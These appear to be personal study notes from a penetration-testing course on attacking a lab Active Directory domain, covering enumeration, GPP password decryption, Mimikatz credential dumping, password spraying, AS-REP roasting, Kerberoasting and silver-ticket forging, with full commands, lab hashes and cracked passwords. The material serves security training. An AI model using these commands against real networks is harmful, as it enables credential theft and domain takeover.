> [!info] To bypass the execution policy use `powershell -ep bypass`

Nmap scan in the AD machine:
```text
Target_Name: CORP
NetBIOS_Domain_Name: CORP
NetBIOS_Computer_Name: CLIENT75
DNS_Domain_Name: corp.com
DNS_Computer_Name: client75.corp.com
DNS_Tree_Name: corp.com
```

We can get the DC ip with foothold with the command nslookup:
```shell
PS C:\Users\stephanie> nslookup
DNS request timed out.
    timeout was 2 seconds.
Default Server:  UnKnown
Address:  192.168.211.70
```

Or doing a zone transfer if the box has the port 53 open

| **Command** | **Description** |
| ---- | ---- |
| `ldapdomaindump -u <DOMAIN\username> -p <Password> <DC Ip> -o ldap_stuff`<br>`ldapdomaindump -u 'CORP\stephanie' -p 'LegmanTeamBenzoin!!' 192.168.211.70 -o ldap_stuff` | LDAP Domain Dump |
| `bloodhound-python -u <UserName> -p <Password> -ns <DC Ip> -d <Domain> -c All`<br>`bloodhound-python -u 'stephanie' -p 'LegmanTeamBenzoin!!' -ns 192.168.211.70 -d corp.com -c all` | Bloodhound |
| `.\SharpHound.exe -c All --zipfilename output-files` | SharpHound exe |
| `Import-Module .\Sharphound.ps1`<br>`Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"`<br> | SharpHound ps |

We need to have a clear list of computers, users, and groups in the domain, and continue our enumeration focusing on the relationships between as many objects as possible.

Members of **Domain Admins** are among the most privileged objects in the domain. If an attacker compromises a member of this group (often referred to as _domain administrators_), they essentially gain complete control over the domain.

This attack vector could extend beyond a single domain since an AD instance can host more than one domain in a _domain tree_ or multiple domain trees in a _domain forest_. While there is a Domain Admins group for each domain in the forest, members of the **Enterprise Admins** group are granted full control over all the domains in the forest and have Administrator privilege on all DCs. This is obviously a high-value target for an attacker.

# Manual Enumeration

#### Users & Groups: Building a script
| **Command** | **Description** |
| ---- | ---- |
| `net user /domain` | List AD users |
| `net user <user> /domain` | List AD info for one specific user |
| `net group /domain` | List AD groups |
| `net group <group> /domain` | List AD info for one specific group |
LDAP Path prototype: `LDAP://HostName[:PortNumber][/DistinguishedName]`

Script to build LDAP Path:
```shell
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"
$LDAP
```

Let's run the script.
```shell
PS C:\Users\stephanie> .\enumeration.ps1
LDAP://DC1.corp.com/DC=corp,DC=com
```

So far, our script builds the required LDAP path. Now we can build in search functionality. To do this, we will use two .NET classes that are located in the _System.DirectoryServices_ namespace, more specifically the _DirectoryEntry_ and _DirectorySearcher_ classes

Script FindAll():
```shell
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.FindAll()
```

Output:
```text
PS C:\Users\stephanie> .\enumeration.ps1

Path
----
LDAP://DC1.corp.com/DC=corp,DC=com
LDAP://DC1.corp.com/CN=Users,DC=corp,DC=com
LDAP://DC1.corp.com/CN=Computers,DC=corp,DC=com
LDAP://DC1.corp.com/OU=Domain Controllers,DC=corp,DC=com
LDAP://DC1.corp.com/CN=System,DC=corp,DC=com
LDAP://DC1.corp.com/CN=LostAndFound,DC=corp,DC=com
...
```

Script to filter all info for jeffadmin:
```shell
[...SNIP...]
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="name=jeffadmin"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    Write-Host "-------------------------------"
}
```

We can make the script more flexible, allowing us to add the required parameters via the command line. For example, we could have the script accept the _samAccountType_ we wish to enumerate as a command line argument. There are many ways we can accomplish this. One way is to simply encapsulate the current functionality of the script into an actual function. An example of this is shown below.
```shell
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

}
```

Import the script to PS and we can query like this:
```shell
PS C:\Users\stephanie> $group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Development Department*))"

PS C:\Users\stephanie> $group.properties.member
CN=Management Department,DC=corp,DC=com
CN=pete,CN=Users,DC=corp,DC=com
CN=dave,CN=Users,DC=corp,DC=com
```

#### PowerView & Miscellaneous / SPNs

Do not forget to import the module first

| **Command** | **Description** |
| ---- | ---- |
| `Get-NetDomain` | AD Info |
| `Get-NetUser`<br>`Get-NetUser "jeff"`<br>`Get-NetUser \| select cn,pwdlastset,lastlogon`<br> | AD Users<br>(No diagonal bar in the pipe) |
| `Get-NetGroup`<br>`Get-NetGroup "Sales Department"`<br>`Get-NetGroup \| select member` | AD groups<br>(No diagonal bar in the pipe) |
| `Get-NetComputer`<br>`Get-NetComputer \| select operatingsystem,dnshostname` | AD Computers<br>(No diagonal bar in the pipe) |
| `Find-LocalAdminAccess` | Check if our user has administrative permissions on any computer in the domain |
| `Get-NetSession -ComputerName web04`<br>`Get-NetSession -ComputerName web04 -Verbose` | Find logged users in the specified computer. It relies on the SrvsvcSessionInfo service<br>If no output retrieved we may have no permission |
| `Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ \| fl` | Check permissions to enumerate sessions with _NetSessionEnum_ (previous command) |
| `.\PsLoggedon.exe \\web04` | Another way to find logged users in the specified computer. It relies on the _Remote Registry_ service.<br>It has not been enabled by default on Windows workstations since Windows 8, but system administrators may enable it |

> [!info] One attack vector could be find if our current user has administrative permissions on any computer in the domain, and then check for logged users to log in there and steal their credentials

Applications must be executed in the context of an operating system user. If a user launches an application, that user account defines the context. However, services launched by the system itself run in the context of a _Service Account_. In other words, isolated applications can use a set of predefined service accounts, such as _LocalSystem_, _LocalService_ and _NetworkService_.

For more complex applications, a domain user account may be used to provide the needed context while still maintaining access to resources inside the domain. When applications like _Exchange_, MS SQL, or _Internet Information Services_ (IIS) are integrated into AD, a unique service instance identifier known as _Service Principal Name_ (SPN) associates a service to a specific service account in Active Directory. 

To enumerate SPNs in the domain:

| **Command** | **Description** |
| ---- | ---- |
| `setspn -L iis_service` | Enumerate SPNs for specified user |
| `Get-NetUser -SPN \| select samaccountname,serviceprincipalname`<br> | Enumerate SPNs with a pipe to retrieve samaccountname and serviceprincipalname<br>(No diagonal bar in the pipe) |
In the example, the _serviceprincipalname_ of thie iis_service is set to "HTTP/web04.corp.com, HTTP/web04, HTTP/web04.corp.com:80", which is indicative of a web server. We can attempt to resolve web04.corp.com with **nslookup**:

```shell
PS C:\Tools\> nslookup.exe web04.corp.com
Server:  UnKnown
Address:  192.168.50.70

Name:    web04.corp.com
Address:  192.168.50.72
```

#### Object Permissions & Domain Shares / ACEs & ACL

AD may have a set of permissions applied to it with multiple _Access Control Entries_ (ACE). These ACEs make up the _Access Control List_ (ACL). Each ACE defines whether access to the specific object is allowed or denied. AD includes a wealth of permission types that can be used to configure an ACE. However, from an attacker's standpoint, we are mainly interested in a few key permission types. Here's a list of the most interesting ones along with a description of the permissions they provide: (The highest access permission we can have on an object is **GenericAll**)
```text
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```

We can use **Get-ObjectAcl** to enumerate ACEs with PowerView

| **Command** | **Description** |
| ---- | ---- |
| `Get-ObjectAcl -Identity stephanie` | To enumerate ACE |
| `Get-ObjectAcl -Identity "Management Department" \| ? {$_.ActiveDirectoryRights -eq "GenericAll"} \| select SecurityIdentifier,ActiveDirectoryRights` | Filtering the ActiveDirectoryRights property, only displaying the values that equal GenericAll. Pipe the results into select, only displaying the SecurityIdentifier and ActiveDirectoryRights properties<br>(No diagonal bar in the pipe) |
| `Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104`<br>`"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104" \| Convert-SidToName`<br> | To convert the Security Identifier (SID) to an actual domain object name<br>The second way we can transform many SIDs at the same time<br>(No diagonal bar in the pipe) |
| `net group "Management Department" stephanie /add /domain` | Add a specified user to a specified group |
| `net group "Management Department" stephanie /del /domain` | Delete a specified user from the specified group |
| `Find-DomainShare` | List shares in the domain |
| `Find-DomainShare -CheckShareAccess` | List shares available to us |
In this instance, we'll first focus on **SYSVOL**, as it may include files and folders that reside on the domain controller itself. This particular share is typically used for various domain policies and scripts. By default, the **SYSVOL** folder is mapped to **%SystemRoot%\\SYSVOL\\Sysvol\\domain-name** on the domain controller and every domain user has access to it.
```shell
PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\

    Directory: \\dc1.corp.com\sysvol\corp.com

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/21/2022   1:11 AM                Policies
d-----          9/2/2022   4:08 PM                scripts

PS C:\Tools> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups   clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User   clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
          name="Administrator (built-in)"
          image="2"
          changed="2012-05-03 11:45:20"
          uid="{253F4D90-150A-4EFB-BCC8-6E894A9105F7}">
    <Properties
          action="U"
          newName=""
          fullName="admin"
          description="Change local admin"
          cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
          changeLogon="0"
          noChange="0"
          neverExpires="0"
          acctDisabled="0"
          userName="Administrator (built-in)"
          expires="2016-02-10" />
  </User>
</Groups>
```

Due to the naming of the folder and the name of the file itself, it appears that this is an older domain policy file. This is a common artifact on domain shares as system administrators often forget them when implementing new policies. In this particular case, the XML file describes an old policy (helpful for learning more about the current policies) and an encrypted password for the local built-in Administrator account. The encrypted password could be extremely valuable for us. Historically, system administrators often changed local workstation passwords through _Group Policy Preferences_ (GPP).

However, even though GPP-stored passwords are encrypted with AES-256, the private key for the encryption has been posted on _MSDN_.[3](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/active-directory-introduction-and-enumeration/manual-enumeration-expanding-our-repertoire/enumerating-domain-shares#fn3) We can use this key to decrypt these encrypted passwords. In this case, we'll use the **gpp-decrypt** ruby script in Kali Linux that decrypts a given GPP encrypted string:

```bash
kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
P@$$w0rd
```

# Attacking AD Authentication

## Cached AD Credentials / Mimikatz

We can enter **privilege::debug** to engage the _SeDebugPrivlege_ privilege, which will allow us to interact with a process owned by another account

```shell
PS C:\Windows\system32> cd C:\Tools

PS C:\Tools\> .\mimikatz.exe
...

mimikatz # privilege::debug
Privilege '20' OK
```

We can run **sekurlsa::logonpasswords** to dump the credentials of all logged-on users with the _Sekurlsa_ module.

```shell
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 4876838 (00000000:004a6a26)
Session           : RemoteInteractive from 2
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/9/2022 12:32:11 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105
        msv :
         [00000003] Primary
         * Username : jeff
         * Domain   : CORP
         * NTLM     : 2688c6d2af5e9c7ddb268899123744ea
         * SHA1     : f57d987a25f39a2887d158e8d5ac41bc8971352f
         * DPAPI    : 3a847021d5488a148c265e6d27a420e6
        [...SNIP...]
...
Authentication Id : 0 ; 122474 (00000000:0001de6a)
Session           : Service from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/9/2022 1:32:23 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        [...SNIP...]
...
```

The output above shows all credential information stored in LSASS for the domain users _jeff_ and _dave_, including cached hashes. We can observe two types of hashes highlighted in the output. This will vary based on the functional level of the AD implementation. For AD instances at a functional level of Windows 2003, NTLM is the only available hashing algorithm. For instances running Windows Server 2008 or later, both NTLM and SHA-1 (a common companion for AES encryption) may be available. On older operating systems like Windows 7, or operating systems that have it manually set, WDigest[11](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/understanding-active-directory-authentication/cached-ad-credentials#fn11) will be enabled. When WDigest is enabled, running Mimikatz will reveal cleartext passwords alongside the password hashes.

A different approach and use of Mimikatz is to exploit Kerberos authentication by abusing TGT and service tickets. As already discussed, we know that Kerberos TGT and service tickets for users currently logged on to the local machine are stored for future use. These tickets are also stored in LSASS, and we can use Mimikatz to interact with and retrieve our own tickets as well as the tickets of other local users. Let's open a second PowerShell window and list the contents of the SMB share on WEB04 with UNC path **\\web04.corp.com\backup**. This will create and cache a service ticket.

```shell
PS C:\Users\jeff> dir \\web04.corp.com\backup


    Directory: \\web04.corp.com\backup


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/13/2022   2:52 AM              0 backup_schemata.txt
```

Once we've executed the directory listing on the SMB share, we can use Mimikatz to show the tickets that are stored in memory by entering **sekurlsa::tickets**.

```shell
mimikatz # sekurlsa::tickets

Authentication Id : 0 ; 656588 (00000000:000a04cc)
Session           : RemoteInteractive from 2
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/13/2022 2:43:31 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105

         * Username : jeff
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 9/13/2022 2:59:47 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : cifs ; web04.corp.com ; @ CORP.COM
           Target Name  (02) : cifs ; web04.corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM
           [...SNIP...]
           Session Key       : 0x00000001 - des_cbc_crc
             c44762f3b4755f351269f6f98a35c06115a53692df268dead22bc9f06b6b0ce5
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             bf25fbd514710a98abaccdf026b5ad14730dd2a170bca9ded7db3fd3b853892a
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
...
```

The output shows both a TGT and a TGS. Stealing a TGS would allow us to access only particular resources associated with those tickets. Alternatively, armed with a TGT, we could request a TGS for specific resources we want to target within the domain


## Password Spraying

> If you receive a network error, make sure that the encoding of **usernames.txt** is _ANSI_. You can use Notepad's _Save As_ functionality to change the encoding.

To review account policy as registered user we can use command `net accounts`. Here we can _Lockout threshold_ and _Lockout observation window_.

For crackmapexec and kerbrute, we had to provide a list of usernames. To obtain a list of all domain users, we can leverage techniques we learned in the Module _Active Directory Introduction and Enumeration_ or use the built-in user enumeration functions of both tools.
#### Password Spraying by PS Script

For password spraying tactic we can use the PowerShell script **[Spray-Passwords.ps1](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Spray-Passwords.ps1)**

```shell
PS C:\Tools> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
WARNING: also targeting admin accounts.
Performing brute force - press [q] to stop the process and print results...
Guessed password for user: 'pete' = 'Nexus123!'
Guessed password for user: 'jen' = 'Nexus123!'
Users guessed are:
 'pete' with password: 'Nexus123!'
 'jen' with password: 'Nexus123!'
```

#### Password Spraying by SMB and Crackmapexec

We have to specify the wordlist for users. As a bonus, however, the output of crackmapexec not only displays if credentials are valid, but also if the user with the identified credentials has administrative privileges on the target system.

```bash
kali@kali:~$ cat users.txt
dave
jen
pete

kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
SMB         192.168.50.75   445    CLIENT75         [*] Windows 10.0 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.50.75   445    CLIENT75         [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE 
SMB         192.168.50.75   445    CLIENT75         [+] corp.com\jen:Nexus123!
SMB         192.168.50.75   445    CLIENT75         [+] corp.com\pete:Nexus123!
```

#### Password Spraying by Kerbrute (TGT)

We can also use the tool _kerbrute_, implementing this technique to spray passwords. Since this tool is cross-platform, we can use it on Windows and Linux.

```shell
PS C:\Tools> type .\usernames.txt
pete
dave
jen

PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 09/06/22 - Ronnie Flathers @ropnop

2022/09/06 20:30:48 >  Using KDC(s):
2022/09/06 20:30:48 >   dc1.corp.com:88
2022/09/06 20:30:48 >  [+] VALID LOGIN:  jen@corp.com:Nexus123!
2022/09/06 20:30:48 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
2022/09/06 20:30:48 >  Done! Tested 3 logins (2 successes) in 0.041 seconds
```

## AS-REP Roasting

By default, the AD user account option _Do not require Kerberos preauthentication_ is disabled, meaning that Kerberos preauthentication is performed for all users. However, it is possible to enable this account option manually. In assessments, we may find accounts with this option enabled as some applications and technologies require it to function properly.

```bash
kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
Name  MemberOf  PasswordLastSet             LastLogon                   UAC      
----  --------  --------------------------  --------------------------  --------
dave            2022-09-02 19:21:17.285464  2022-09-07 12:45:15.559299  0x410200 


kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

$krb5asrep$23$dave@CORP.COM:b24a619cfa585dc1894fd6924162b099$1be2e632a9446d1447b5ea80b739075ad214a578f03773a7908f337aa705bcb711f8bce2ca751a876a7564bdbd4a926c10da32b03ec750cf33a2c37abde02f28b7ab363ffa1d18c9dd0262e43ab6a5447db44f71256120f94c24b17b1df465beed362fcb14a539b4e9678029f3b3556413208e8d644fed540d453e1af6f20ab909fd3d9d35ea8b17958b56fd8658b144186042faaa676931b2b75716502775d1a18c11bd4c50df9c2a6b5a7ce2804df3c71c7dbbd7af7adf3092baa56ea865dd6e6fbc8311f940cd78609f1a6b0cd3fd150ba402f14fccd90757300452ce77e45757dc22:Flowers1
```

The output shows that _dave_ has the user account option _Do not require Kerberos preauthentication_ enabled, meaning it's vulnerable to AS-REP Roasting. Then we cracked his password.

We can also perform AS-REP Roasting on Windows. We'll use _Rubeus_, which is a toolset for raw Kerberos interactions and abuses. To perform this attack, we'll connect to CLIENT75 via RDP as domain user _jeff_ with the password _HenchmanPutridBonbon11_. Since we're performing this attack as a pre-authenticated domain user, we don't have to provide any other options to Rubeus except **asreproast**. Rubeus will automatically identify vulnerable user accounts. We also add the flag **/nowrap** to prevent new lines being added to the resulting AS-REP hashes.

```shell
PS C:\Users\jeff> cd C:\Tools

PS C:\Tools> .\Rubeus.exe asreproast /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: AS-REP roasting

[*] Target Domain          : corp.com

[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : dave
[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com
[*] Using domain controller: DC1.corp.com (192.168.50.70)
[*] Building AS-REQ (w/o preauth) for: 'corp.com\dave'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$dave@corp.com:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4C59410DE2984EDF35053B7954E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB972506B4989E9ABA2899C042E66792F33B119FAB1837D94EB654883C6C3F2DB6D4A8D44A8D9531C2661BDA4DD231FA985D7003E91F804ECF5FFC0743333959470341032B146AB1DC9BD6B5E3F1C41BB02436D7181727D0C6444D250E255B7261370BC8D4D418C242ABAE9A83C8908387A12D91B40B39848222F72C61DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A
```

To identify users with the enabled AD user account option _Do not require Kerberos preauthentication_, we can use PowerView's _Get-DomainUser_ function with the option **-PreauthNotRequired** on Windows.

Let's assume that we are conducting an assessment in which we cannot identify any AD users with the account option _Do not require Kerberos preauthentication_ enabled. While enumerating, we notice that we have _GenericWrite_ or _GenericAll_ permissions[5](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/as-rep-roasting#fn5) on another AD user account. Using these permissions, we could reset their passwords, but this would lock out the user from accessing the account. We could also leverage these permissions to modify the User Account Control value of the user to not require Kerberos preauthentication.[6](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/as-rep-roasting#fn6) This attack is known as _Targeted AS-REP Roasting_. Notably, we should reset the User Account Control value of the user once we've obtained the hash.

## Kerberoasting

To perform Kerberoasting, we'll use Rubeus again. We specify the **kerberoast** command to launch this attack technique. In addition, we'll provide **hashes.kerberoast** as an argument for **/outfile** to store the resulting TGS-REP hash in. Since we'll execute Rubeus as an authenticated domain user, the tool will identify all SPNs linked with a domain user.

```shell
PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : corp.com
[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : iis_service
[*] DistinguishedName      : CN=iis_service,CN=Users,DC=corp,DC=com
[*] ServicePrincipalName   : HTTP/web04.corp.com:80
[*] PwdLastSet             : 9/7/2022 5:38:43 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Tools\hashes.kerberoast
```

The output shows that Rubeus identified one user account vulnerable to Kerberoasting and wrote the hash to an output file. Now, let's copy **hashes.kerberoast** to our Kali machine. We can then review the Hashcat help for the correct mode to crack a TGS-REP hash.

```bash
kali@kali:~$ cat hashes.kerberoast
$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940AD9DCF5DD5CD8E91A86D4BA0396DB$F57066A4F4F8FF5D70DF39B0C98ED7948A5DB08D689B92446E600B49FD502DEA39A8ED3B0B766E5CD40410464263557BC0E4025BFB92D89BA5C12C26C72232905DEC4D060D3C8988945419AB4A7E7ADEC407D22BF6871D...
...

kali@kali:~$ hashcat --help | grep -i "Kerberos"         
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...
d8a2033fc64622eaef566f4740659d2e520b17bd383a47da74b54048397a4aaf06093b95322ddb81ce63694e0d1a8fa974f4df071c461b65cbb3dbcaec65478798bc909bc94:Strawberry1
```

## Silver Tickets

In general, we need to collect the following three pieces of information to create a silver ticket:
- SPN password hash
- Domain SID
- Target SPN

Now, we do not have permissions

```shell
PS C:\Users\jeff> iwr -UseDefaultCredentials http://web04
iwr :
401 - Unauthorized: Access is denied due to invalid credentials.
Server Error
...
```

Since we are a local Administrator on this machine where _iis_service_ has an established session, we can use Mimikatz to retrieve the SPN password hash (NTLM hash of _iis_service_), which is the first piece of information we need to create a silver ticket. Let's start PowerShell as Administrator and launch Mimikatz. As we already learned, we can use **privilege::debug** and **sekurlsa::logonpasswords** to extract cached AD credentials.

```shell
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1147751 (00000000:00118367)
Session           : Service from 0
User Name         : iis_service
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/14/2022 4:52:14 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1109
        msv :
         [00000003] Primary
         * Username : iis_service
         * Domain   : CORP
         * NTLM     : 4d28cf5252d39971419580a51484ca09
         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
...
```

Now, let's obtain the domain SID, the second piece of information we need. We can enter **whoami /user** to get the SID of the current user. Alternatively, we could also retrieve the SID of the SPN user account from the output of Mimikatz, since the domain user accounts exist in the same domain. As covered in the _Windows Privilege Escalation_ Module, the SID consists of several parts. Since we're only interested in the Domain SID, we'll omit the RID of the user.

```
PS C:\Users\jeff> whoami /user

USER INFORMATION
----------------

User Name SID
========= =============================================
corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
```

The domain SID would be **S-1-5-21-1987370270-658905905-1781884369**, not including the last part.

The last list item is the target SPN. For this example, we'll target the HTTP SPN resource on WEB04 (_HTTP/web04.corp.com:80_) because we want to access the web page running on IIS.

Now that we have collected all three pieces of information, we can build the command to create a silver ticket with Mimikatz. We can create the forged service ticket with the _kerberos::golden_ module. This module provides the capabilities for creating golden and silver tickets alike. We'll explore the concept of golden tickets in the Module _Lateral Movement in Active Directory_.

We need to provide the domain SID (**/sid:**), domain name (**/domain:**), and the target where the SPN runs (**/target:**). We also need to include the SPN protocol (**/service:**), NTLM hash of the SPN (**/rc4:**), and the **/ptt** option, which allows us to inject the forged ticket into the memory of the machine we execute the command on. Finally, we must enter an existing domain user for **/user:**. This user will be set in the forged ticket. For this example, we'll use _jeffadmin_. However, we could also use any other domain user since we can set the permissions and groups ourselves.

The complete command can be found in the following listing:

```
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
User      : jeffadmin
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt
Service   : http
Target    : web04.corp.com
Lifetime  : 9/14/2022 4:37:32 AM ; 9/11/2032 4:37:32 AM ; 9/11/2032 4:37:32 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session

mimikatz # exit
Bye!
```

A new service ticket for the SPN _HTTP/web04.corp.com_ has been loaded into memory and Mimikatz set appropriate group membership permissions in the forged ticket. From the perspective of the IIS application, the current user will be both the built-in local administrator ( _Relative Id: 500_ ) and a member of several highly-privileged groups, including the Domain Admins group ( _Relative Id: 512_ ) as highlighted above.

This means we should have the ticket ready to use in memory. We can confirm this with **klist**. 

```
PS C:\Tools> klist

Current LogonId is 0:0xa04cc

Cached Tickets: (1)

#0>     Client: jeffadmin @ corp.com
        Server: http/web04.corp.com @ corp.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 9/14/2022 4:37:32 (local)
        End Time:   9/11/2032 4:37:32 (local)
        Renew Time: 9/11/2032 4:37:32 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

The output shows that we have the silver ticket for _jeffadmin_ to access _http/web04.corp.com_ submitted to our current session. This should allow us to access the web page on WEB04 as _jeffadmin_. Let's verify our access using the same command as before.

```
PS C:\Tools> iwr -UseDefaultCredentials http://web04

StatusCode        : 200
